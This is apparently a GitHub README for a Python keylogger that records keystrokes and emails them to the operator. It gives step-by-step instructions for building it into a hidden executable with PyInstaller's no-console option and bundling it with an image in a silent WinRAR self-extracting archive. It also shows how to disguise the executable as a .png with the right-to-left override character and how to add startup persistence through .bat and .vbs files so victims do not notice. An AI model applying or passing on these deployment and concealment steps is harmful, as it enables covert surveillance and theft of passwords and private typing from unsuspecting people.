# [python-keylogger](https://github.com/EmaBixD/python-keylogger)
Keylogger made with python that records keys and sends them to an email address.
This is a collection of multiple codes put together. It aims for stability, open source, and constant updates.

## Requirements
- pynput

## Configuration
Make sure to enter your email address and password for sending and receiving emails in the [keylogger.py](https://github.com/EmaBixD/python-keylogger/edit/main/keylogger.py) file.

## BUILD AN EXECUTABLE FROM PYTHON FILE
### Installing pip
- `py get-pip.py`

### Installing pyinstaller with pip
- `pip install pyinstaller`

### Compiling .py in .exe using pyinstaller
With prompt opened in the same directory of example.py type:
`pyinstaller --noconsole --onefile example.py`
- noconsole: does not show the console when the executable is launched
- onefile: create a single executable file, containing all the necessary libraries, etc.

## HOW TO HIDE ANY EXECUTABLE INSIDE A PHOTO USING *WINRAR*
### Pack all files in a single executable
1. Select all the files files `(image.jpg, keylogger.vbs, keylogger.bat, keylogger.exe)` and press `Add to an archive` options from WinRAR
2. Check "Create SFX archive"
3. "Advanced" tab -> press "SFX options"
	- `Setup` -> In "Run after extraction" write:
		```sh
		image.jpg
 		keylogger.vbs
 		keylogger.exe
 		```
	- `Modes` -> Check "Unpack to temporary folder", select "Hide all"
	- `(OPTIONAL) Text and icon` -> "Load SFX icon from the file" to give a preview of the file
	- `Update` -> Check "Overwrite all files"
4. Confirm all

### Change file extension: from .exe to .png
1. Rename "example.exe" to "example.scr" (.scr keeps the same properties of .exe, but is less suspicious because it is shown as "screen saver")
2. Rename adding "gnp" before ".scr" ("examplegnp.scr")
3. Rename again, and, placing the cursor after "example" and before "gnp.scr" right click
4. From the right-click menu choose `Insert Unicode control character` -> `RLO` (only "gnp.scr" part will be rotated showing "examplercs.png")
5. Save and make sure to **NOT REMOVE** "rcs" part, otherwise executable will not work!

## What are .bat and .vbs files used for?
The .bat file is used to clone the keylogger.exe file in the startup folder so that it starts every time you turn on your computer.
The .vbs file, is simply used to call the .bat file without the prompt appearing, making the user suspicious.

*In the future this will be probably simplified in a sigle file*

## Known bugs:
- [ ]  Slow and laggy typing while keylogger is active, will be fixed soon

# ⚠ DISCLAIMER ⚠
Usage of the provided code is at your own risk. The author assumes no responsibility for any actions taken with the code. Please ensure compliance with applicable laws and use the code responsibly. ❗

## CREDITS:
***[Script](https://github.com/misbah4064/keylogger_sends_email)***
***[Hiding](https://www.youtube.com/watch?v=cXEkSQl9wmw)***
